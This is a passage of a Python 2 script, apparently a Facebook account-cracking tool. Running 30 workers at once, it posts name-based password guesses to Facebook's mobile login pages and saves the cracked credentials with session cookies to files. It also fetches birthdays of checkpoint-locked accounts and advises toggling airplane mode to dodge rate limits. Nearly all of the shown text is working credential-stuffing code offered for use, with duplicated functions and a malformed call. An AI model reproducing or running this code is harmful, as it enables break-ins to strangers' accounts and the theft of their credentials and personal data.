                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mUse airplane mode for 3 sec\n'%(H,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                                
                            os.remove(self.apk)
                            hasil(ok,cp)
                            print '%s║%s '%(O,N)
                        elif cin == '4':
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mUse airplane mode for 3 sec\n'%(H,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
             
                            os.remove(self.apk)
                            hasil(ok,cp)
                            print '%s║%s '%(O,N)
                        elif cin == '5':
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97muse airplane mode for 3 sec\n'%(H,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
            
                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n%s[%s×%s] input Correct'%(N,M,N);self.__yan__()
                    print '%s║%s '%(O,N)
                    print '\033[0;96m╠══[ \033[0;93mPlease Select Method To Login \033[0;96m]'
                    print '%s║%s '%(O,N)
                    print '%s╠══[1]%s Method \033[0;93mApi \033[0;97mv1 \033[0;96m[\033[0;93mFast\033[0;96m]'%(O,N)
                    print '%s╠══[2]%s Method \033[0;93mApi \033[0;97mv2'%(O,N)
                    print '%s╠══[3]%s Method \033[0;93mMbasic \033[0;97mv1 \033[0;96m[\033[0;93mSlow\033[0;96m]'%(O,N)
                    print '%s╠══[4]%s Method \033[0;93mMbasic \033[0;97mv2'%(O,N)
                    print '%s╠══[5]%s Method \033[0;93mMobile \033[0;96m[\033[0;93mvery slow\033[0;96m]'%(O,N)
                    print '%s║%s '%(O,N)
                    __yan__(pwek.split(','))
                    break  
        elif ___yayanganteng___ in ('T', 't'):
            print '\n\033[0;96m╔══[ \033[0;93mPlease Select Method To Login \033[0;96m]'
            print '%s║%s '%(O,N)
            print '%s╠══[1]%s Method \033[0;93mApi \033[0;97mv1 \033[0;96m[\033[0;93mFast\033[0;96m]'%(O,N)
            print '%s╠══[2]%s Method \033[0;93mApi \033[0;97mv2'%(O,N)
            print '%s╠══[3]%s Method \033[0;93mMbasic \033[0;97mv1 \033[0;96m[\033[0;93mslow\033[0;96m]'%(O,N)
            print '%s╠══[4]%s Method \033[0;93mMbasic \033[0;97mv2'%(O,N)
            print '%s╠══[5]%s Method \033[0;93mMobile \033[0;96m[\033[0;93mvery slow\033[0;96m]'%(O,N)
            print '%s║%s '%(O,N)
            self.__pler__()
        else:
            print '%s%s╚══[%s y/t stupid ]'%(N,K,N);time.sleep(2);moch_yayan()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[••]%s[Crack][%s/%s][\033[092mOK:%s\033[097m][\033[093mCP:%s\033[097m] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s • %s • %s %s %s     %s' % (O,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                    
                print '\r%s[CP] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
    
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[••]%s[Crack][%s/%s][\033[092mOK:%s\033[097m][\033[093mCP:%s\033[097m] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s • %s • %s %s %s     %s' % (O,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                    
                print '\r%s[CP] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
    
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[••]%s[Crack][%s/%s][\033[092mOK:%s\033[097m][\033[093mCP:%s\033[097m] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s • %s • %s %s %s     %s' % (O,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r%s[CP] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
    
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[••]%s[Crack][%s/%s][\033[092mOK:%s\033[097m][\033[093mCP:%s\033[097m] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s • %s • %s %s %s     %s' % (O,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r%s[CP] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[••]%s[Crack][%s/%s][\033[092mOK:%s\033[097m][\033[093mCP:%s\033[097m] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s • %s • %s %s %s     %s' % (O,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r%s[CP] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\033[0;96m╠══[?] \033[0;97mMethod : ')
        print '%s║%s '%(O,N)
        if yan == '':
            print '%s[%s×%s] Fill Empty places'%(N,M,N);self.__pler__()
            print '%s║%s '%(O,N)
        elif yan in ('1', '01'):
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mTurn on/off airplane mode for 5 sec\n'%(H,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
            print '%s║%s '%(O,N)
        elif yan in ('2', '02'):
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mTurn on/off airplane mode for 5 sec\n'%(H,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            
            os.remove(self.apk)
            hasil(ok,cp)
            print '%s║%s '%(O,N)
        elif yan in ('3', '03'):
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mTurn on/off airplane mode for 5 sec\n'%(H,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
                        
            os.remove(self.apk)
            hasil(ok,cp)
            print '%s║%s '%(O,N)
        elif yan in ('4', '04'):
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mUse airplane mode for 5 sec\n'%(H,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"786", xz[0]+"123456", xz[0]+"09"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"786", xz[0]+"123456", xz[0]+"09"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
                        
            os.remove(self.apk)
            hasil(ok,cp)
            print '%s║%s '%(O,N)
        elif yan in ('5', '05'):
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mTurn on/of airplane mode for 5 sec\n'%(H,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"786", xz[0]+"09"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '%s╠══[%s!%s] Choose the Right One !!'%(N,O,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
